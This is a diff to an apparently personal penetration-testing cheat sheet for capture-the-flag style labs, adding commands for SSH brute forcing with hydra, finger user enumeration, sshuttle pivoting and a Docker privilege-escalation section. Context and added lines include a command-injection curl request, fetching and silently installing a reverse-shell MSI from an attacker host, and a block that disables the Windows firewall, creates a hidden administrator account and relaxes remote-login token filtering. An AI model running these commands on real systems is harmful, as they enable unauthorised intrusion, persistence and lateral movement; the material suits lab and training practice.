@@ -47,8 +47,11 @@ Curl with urlencoded payloads:
 curl with POST urlencoded payload:
 `curl http://$IP/admin.php -X POST --data-urlencode "value1=|| whoami" --data-urlencode "submit=Submit Query"`
 
-SSH Brute Force:
-`hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://$IP -t 4`
+SSH Brute Force (Super slow, since max 4 threads. Use small wordlist):
+`hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://$IP -t 4 -s 22`
+
+SSH prompts wrong key exchange method:
+`ssh -oKexAlgorithms=diffie-hellman-group1-sha1 root@$IP`
 
 DNS Zone Transfer any domain:
 `dig axfr @$IP`
@@ -111,6 +114,14 @@ mysql -u username -pPASSWORD -e "SELECT @@version;"
 Create your own privatekey (can be used to bypass JWT cookie that requires valid private key):
 `openssl genrsa -out privKey.key 2048`
 
+Port 79 - finder service. Protocol allows fingepritning users on remote system, so we can enumerate users:
+```
+finger @$IP
+finger admin@$IP
+# Brute force
+./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76
+```
+
 # Reverse Shells or Shell access
 
 Reverse Shell Payloads: x
@@ -152,7 +163,7 @@ Linux binaries with SUID: https://gtfobins.github.io/
 
 Windows binaries to download execute etc: https://lolbas-project.github.io/
 
-# Linux
+## Linux
 
 Valid users: `cat /etc/passwd | grep 'home\|root'`
 
@@ -174,7 +185,7 @@ Find folder or file recursively: `find / -name '.git' 2>/dev/null`
 
 Find Cronjobs: `cat /etc/cron*` better yet, download binary x to find hidden cronjobs
 
-# Windows
+## Windows
 
 Enumerate all users in the domain: `net user /domain`
 
@@ -236,7 +247,18 @@ curl http://10.10.14.116:9000/reverse.msi -o reverse.msi
 msiexec /quiet /qn /i reverse.msi
 ```
 
-# Docker Priv Esc
+Turn off firewall and create a backup account:
+```
+NetSh Advfirewall set allprofiles state off
+net user defender password1$ /add
+net localgroup administrators defender /add
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+
+#Use any tool to log in locally
+wmiexec.py defender@$IP
+```
+
+## Docker Priv Esc
 CVE-2019-5736. Following https://github.com/Frichetten/CVE-2019-5736-PoC , we can create a sh binary that will overwrite /bin/sh on the docker instance. This will let us elevate to a root shell.
 
 ```
@@ -265,3 +287,9 @@ chmod +x main
 # Notebook machine (Window 2)
 sudo docker exec -it dockername /bin/sh
 ```
+
+# Pivot
+
+Use SSHUTTLE to route all traffic through a machine:
+`sshuttle -r admin@$IP <internal host 1> <internal host 2> <etc>`
+
